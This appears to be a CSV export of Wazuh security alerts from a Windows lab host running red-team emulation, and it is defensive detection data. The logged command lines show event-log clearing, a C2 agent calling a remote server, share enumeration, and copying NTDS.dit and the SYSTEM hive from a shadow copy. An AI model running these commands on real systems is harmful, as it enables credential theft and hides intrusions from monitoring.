@@ -1,0 +1,275 @@
+﻿_index,_id,_version,_score,_source.agent.name,_source.agent.id,_source.manager.name,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.pci_dss,_source.rule.hipaa,_source.rule.tsc,_source.rule.description,_source.rule.groups,_source.rule.id,_source.rule.nist_800_53,_source.rule.gpg13,_source.rule.gdpr,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,_source.agent.ip,_source.data.win.eventdata.subjectLogonId,_source.data.win.eventdata.subjectDomainName,_source.data.win.eventdata.targetLinkedLogonId,_source.data.win.eventdata.impersonationLevel,_source.data.win.eventdata.authenticationPackageName,_source.data.win.eventdata.targetLogonId,_source.data.win.eventdata.logonProcessName,_source.data.win.eventdata.logonGuid,_source.data.win.eventdata.targetUserName,_source.data.win.eventdata.keyLength,_source.data.win.eventdata.elevatedToken,_source.data.win.eventdata.subjectUserSid,_source.data.win.eventdata.processId,_source.data.win.eventdata.processName,_source.data.win.eventdata.targetDomainName,_source.data.win.eventdata.targetUserSid,_source.data.win.eventdata.virtualAccount,_source.data.win.eventdata.logonType,_source.data.win.eventdata.subjectUserName,_source.data.win.system.eventID,_source.data.win.system.keywords,_source.data.win.system.providerGuid,_source.data.win.system.level,_source.data.win.system.channel,_source.data.win.system.opcode,_source.data.win.system.message,_source.data.win.system.version,_source.data.win.system.systemTime,_source.data.win.system.eventRecordID,_source.data.win.system.threadID,_source.data.win.system.computer,_source.data.win.system.task,_source.data.win.system.processID,_source.data.win.system.severityValue,_source.data.win.system.providerName,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.data.win.eventdata.originalFileName,_source.data.win.eventdata.image,_source.data.win.eventdata.product,_source.data.win.eventdata.parentProcessGuid,_source.data.win.eventdata.description,_source.data.win.eventdata.parentCommandLine,_source.data.win.eventdata.processGuid,_source.data.win.eventdata.logonId,_source.data.win.eventdata.parentProcessId,_source.data.win.eventdata.currentDirectory,_source.data.win.eventdata.utcTime,_source.data.win.eventdata.hashes,_source.data.win.eventdata.parentImage,_source.data.win.eventdata.company,_source.data.win.eventdata.commandLine,_source.data.win.eventdata.integrityLevel,_source.data.win.eventdata.fileVersion,_source.data.win.eventdata.user,_source.data.win.eventdata.terminalSessionId,_source.data.win.eventdata.parentUser,_source.data.win.eventdata.ruleName,_source.data.win.eventdata.targetFilename,_source.data.win.eventdata.creationUtcTime,_source.data.win.logFileCleared.subjectDomainName,_source.data.win.logFileCleared.channel,_source.data.win.logFileCleared.subjectUserName,_source.data.win.logFileCleared.subjectLogonId,_source.data.win.logFileCleared.subjectUserSid
+wazuh-alerts-4.x-2024.12.01,2aHPgZMBrrvr6pEbKHxX,1,1,window-agent3,3,Maryam,21,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:40:54.988",EventChannel,1733049655,"Dec 1, 2024 @ 10:40:54.988",192.168.117.134, , , , , , , , , , , , ,1968, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:40:54.093
+ProcessGuid: {15959494-3D35-674C-FF05-000000000F00}
+ProcessId: 1968
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_40wn4tjb.vkb.ps1
+CreationUtcTime: 2024-12-01 10:40:54.093
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:40:54.098902400Z,144195,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3D35-674C-FF05-000000000F00}, , , ,40:54.1, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_40wn4tjb.vkb.ps1,40:54.1, , , , , 
+wazuh-alerts-4.x-2024.12.01,3KHPgZMBrrvr6pEb33zx,1,1,window-agent3,3,Maryam,23,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:41:40.220",EventChannel,1733049701,"Dec 1, 2024 @ 10:41:40.220",192.168.117.134, , , , , , , , , , , , ,2532, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:41:39.339
+ProcessGuid: {15959494-3D63-674C-0E06-000000000F00}
+ProcessId: 2532
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_apewib4s.pej.ps1
+CreationUtcTime: 2024-12-01 10:41:39.339
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:41:39.343513300Z,144260,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3D63-674C-0E06-000000000F00}, , , ,41:39.3, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_apewib4s.pej.ps1,41:39.3, , , , , 
+wazuh-alerts-4.x-2024.12.01,3qHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,1,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.302",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.302",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The Application log file was cleared.""",0,2024-12-01T10:42:29.483368700Z,2265,944,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,Application,mari, , 
+wazuh-alerts-4.x-2024.12.01,36HQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,2,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.331",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.331",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The Key Management Service log file was cleared.""",0,2024-12-01T10:42:29.483368700Z,2268,1140,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,Key Management Service,mari, , 
+wazuh-alerts-4.x-2024.12.01,4KHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,3,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.331",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.331",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The HardwareEvents log file was cleared.""",0,2024-12-01T10:42:29.483368700Z,2266,944,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,HardwareEvents,mari, , 
+wazuh-alerts-4.x-2024.12.01,4aHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,4,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.331",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.331",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The Internet Explorer log file was cleared.""",0,2024-12-01T10:42:29.483368700Z,2267,944,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,Internet Explorer,mari, , 
+wazuh-alerts-4.x-2024.12.01,4qHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,5,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.381",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.381",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The Windows PowerShell log file was cleared.""",0,2024-12-01T10:42:29.499006100Z,2270,1140,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,Windows PowerShell,mari, , 
+wazuh-alerts-4.x-2024.12.01,5KHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,6,FALSE,5, , , ,A Windows log file was cleared,"[""windows"",""windows_logs"",""log_clearing""]",63104, ,"[""10.1""]","[""II_5.1.f""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.381",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.381",192.168.117.134, , , , , , , , , , , , , , , , , , , ,104,0x8000000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,System,0,"""The System log file was cleared.""",0,2024-12-01T10:42:29.499006100Z,2269,1140,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH,System,mari, , 
+wazuh-alerts-4.x-2024.12.01,46HQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,1,FALSE,5, , , ,The audit log was cleared,"[""windows"",""windows_logs"",""log_clearing_auditlog""]",63103, ,"[""10.1""]","[""II_5.1.f"",""IV_30.1.g""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:29.381",EventChannel,1733049750,"Dec 1, 2024 @ 10:42:29.381",192.168.117.134, , , , , , , , , , , , , , , , , , , ,1102,0x4020000000000000,{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148},4,Security,0,"""The audit log was cleared.
+Subject:
+	Security ID:	S-1-5-21-2469675487-2142651230-3143768571-1001
+	Account Name:	mari
+	Domain Name:	DESKTOP-QGB4EQH
+	Logon ID:	0x39922""",0,2024-12-01T10:42:29.483368700Z,48322,1140,DESKTOP-QGB4EQH,104,988,INFORMATION,Microsoft-Windows-Eventlog,"[""Indicator Removal on Host""]","[""T1070""]","[""Defense Evasion""]", , , , , , , , , , , , , , , , , , , , , , , ,DESKTOP-QGB4EQH, ,mari,0x39922,S-1-5-21-2469675487-2142651230-3143768571-1001
+wazuh-alerts-4.x-2024.12.01,5aHQgZMBrrvr6pEbo3xF,1,1,window-agent3,3,Maryam,25,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:42:30.243",EventChannel,1733049751,"Dec 1, 2024 @ 10:42:30.243",192.168.117.134, , , , , , , , , , , , ,4352, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:42:29.389
+ProcessGuid: {15959494-3D95-674C-0F06-000000000F00}
+ProcessId: 4352
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ilxr4oge.0hw.ps1
+CreationUtcTime: 2024-12-01 10:42:29.389
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:42:29.397608500Z,144275,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3D95-674C-0F06-000000000F00}, , , ,42:29.4, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ilxr4oge.0hw.ps1,42:29.4, , , , , 
+wazuh-alerts-4.x-2024.12.01,7qHRgZMBrrvr6pEbLHwB,1,1,window-agent3,3,Maryam,27,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:43:06.308",EventChannel,1733049787,"Dec 1, 2024 @ 10:43:06.308",192.168.117.134, , , , , , , , , , , , ,6328, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:43:05.423
+ProcessGuid: {15959494-3DB9-674C-1006-000000000F00}
+ProcessId: 6328
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_4kohbfsj.k2p.ps1
+CreationUtcTime: 2024-12-01 10:43:05.423
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:43:05.434866300Z,144290,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3DB9-674C-1006-000000000F00}, , , ,43:05.4, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4kohbfsj.k2p.ps1,43:05.4, , , , , 
+wazuh-alerts-4.x-2024.12.01,8KHRgZMBrrvr6pEb93wi,1,1,window-agent3,3,Maryam,29,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:43:56.712",EventChannel,1733049837,"Dec 1, 2024 @ 10:43:56.712",192.168.117.134, , , , , , , , , , , , ,9132, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:43:55.833
+ProcessGuid: {15959494-3DEB-674C-1106-000000000F00}
+ProcessId: 9132
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_20r4c0rj.xes.ps1
+CreationUtcTime: 2024-12-01 10:43:55.833
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:43:55.835330000Z,144305,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3DEB-674C-1106-000000000F00}, , , ,43:55.8, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_20r4c0rj.xes.ps1,43:55.8, , , , , 
+wazuh-alerts-4.x-2024.12.01,'-KHTgZMBrrvr6pEbYnxw,1,1,window-agent3,3,Maryam,32,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:45:31.270",EventChannel,1733049932,"Dec 1, 2024 @ 10:45:31.270",192.168.117.134, , , , , , , , , , , , ,4400, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:45:30.421
+ProcessGuid: {15959494-3E4A-674C-1206-000000000F00}
+ProcessId: 4400
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_xozfahy5.qa0.ps1
+CreationUtcTime: 2024-12-01 10:45:30.421
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:45:30.428601500Z,144320,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3E4A-674C-1206-000000000F00}, , , ,45:30.4, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xozfahy5.qa0.ps1,45:30.4, , , , , 
+wazuh-alerts-4.x-2024.12.01,'-qHUgZMBrrvr6pEbLXyT,1,1,window-agent3,3,Maryam,34,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:46:23.648",EventChannel,1733049984,"Dec 1, 2024 @ 10:46:23.648",192.168.117.134, , , , , , , , , , , , ,4604, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:46:22.763
+ProcessGuid: {15959494-3E7E-674C-1406-000000000F00}
+ProcessId: 4604
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_s4ttmkty.3dz.ps1
+CreationUtcTime: 2024-12-01 10:46:22.763
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:46:22.774655000Z,144338,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3E7E-674C-1406-000000000F00}, , , ,46:22.8, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_s4ttmkty.3dz.ps1,46:22.8, , , , , 
+wazuh-alerts-4.x-2024.12.01,_aHVgZMBrrvr6pEbjXwv,1,1,window-agent3,3,Maryam,36,TRUE,15, , , ,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:47:52.940",EventChannel,1733050073,"Dec 1, 2024 @ 10:47:52.940",192.168.117.134, , , , , , , , , , , , ,2488, , , , , , ,11,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2024-12-01 10:47:52.046
+ProcessGuid: {15959494-3ED7-674C-1506-000000000F00}
+ProcessId: 2488
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_hophyxym.qu2.ps1
+CreationUtcTime: 2024-12-01 10:47:52.046
+User: DESKTOP-QGB4EQH\mari""",2,2024-12-01T10:47:52.057013200Z,144353,5088,DESKTOP-QGB4EQH,11,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , ,{15959494-3ED7-674C-1506-000000000F00}, , , ,47:52.0, , , , , , ,DESKTOP-QGB4EQH\\mari, , ,"technique_id=T1059.001,technique_name=PowerShell",C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hophyxym.qu2.ps1,47:52.0, , , , , 
+wazuh-alerts-4.x-2024.12.01,_qHVgZMBrrvr6pEbjXwv,1,1,window-agent3,3,Maryam,2,FALSE,4, , , ,Powershell process spawned Windows command shell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92004, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:47:53.002",EventChannel,1733050074,"Dec 1, 2024 @ 10:47:53.002",192.168.117.134, , , , , , , ,{15959494-0014-674C-2299-030000000000}, , , , ,4544, , , , , , ,1,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2024-12-01 10:47:52.138
+ProcessGuid: {15959494-3ED8-674C-1606-000000000F00}
+ProcessId: 4544
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: MicrosoftÂ® WindowsÂ® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: ""C:\Windows\system32\cmd.exe"" /c PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe /ldap:all
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-QGB4EQH\mari
+LogonGuid: {15959494-0014-674C-2299-030000000000}
+LogonId: 0x39922
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
+ParentProcessGuid: {15959494-3ED7-674C-1506-000000000F00}
+ParentProcessId: 2488
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe' /ldap:all | out-file -filepath \""$env:temp\T1135SharpSharesOutput.txt\""""
+ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-01T10:47:52.139181600Z,144357,5088,DESKTOP-QGB4EQH,1,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]",Cmd.Exe,C:\\Windows\\System32\\cmd.exe,MicrosoftÂ® WindowsÂ® Operating System,{15959494-3ED7-674C-1506-000000000F00},Windows Command Processor,"powershell.exe -ExecutionPolicy Bypass -C \""cmd /c 'PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe' /ldap:all | out-file -filepath \\\""$env:temp\\T1135SharpSharesOutput.txt\\\""\""",{15959494-3ED8-674C-1606-000000000F00},0x39922,2488,C:\\Windows\\system32\\,47:52.1,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\cmd.exe\"" /c PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe /ldap:all",High,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,1,DESKTOP-QGB4EQH\\mari,"technique_id=T1059.003,technique_name=Windows Command Shell", , , , , , , 
+wazuh-alerts-4.x-2024.12.01,AKHWgZMBrrvr6pEbMX09,1,1,window-agent3,3,Maryam,6,FALSE,4, , , ,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:48:37.001",EventChannel,1733050118,"Dec 1, 2024 @ 10:48:37.001",192.168.117.134, , , , , , , ,{15959494-0014-674C-2299-030000000000}, , , , ,4724, , , , , , ,1,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
+RuleName: technique_id=T1083,technique_name=File and Directory Discovery
+UtcTime: 2024-12-01 10:48:36.164
+ProcessGuid: {15959494-3F04-674C-1706-000000000F00}
+ProcessId: 4724
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: MicrosoftÂ® WindowsÂ® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: cmd.exe /C if not exist C:\Windows\Temp  ( call ) ELSE ( mkdir C:\Windows\Temp ) &&   &&  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE && reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-QGB4EQH\mari
+LogonGuid: {15959494-0014-674C-2299-030000000000}
+LogonId: 0x39922
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
+ParentProcessGuid: {15959494-21B3-674C-8804-000000000F00}
+ParentProcessId: 1808
+ParentImage: C:\Users\Public\splunkd.exe
+ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
+ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-01T10:48:36.166739800Z,144363,5088,DESKTOP-QGB4EQH,1,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]",Cmd.Exe,C:\\Windows\\System32\\cmd.exe,MicrosoftÂ® WindowsÂ® Operating System,{15959494-21B3-674C-8804-000000000F00},Windows Command Processor,"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",{15959494-3F04-674C-1706-000000000F00},0x39922,1808,C:\\Windows\\system32\\,48:36.2,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",C:\\Users\\Public\\splunkd.exe,Microsoft Corporation,cmd.exe /C if not exist C:\\Windows\\Temp  ( call ) ELSE ( mkdir C:\\Windows\\Temp ) &amp;&amp;   &amp;&amp;  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit &amp;&amp; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE &amp;&amp; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE,High,10.0.17134.1 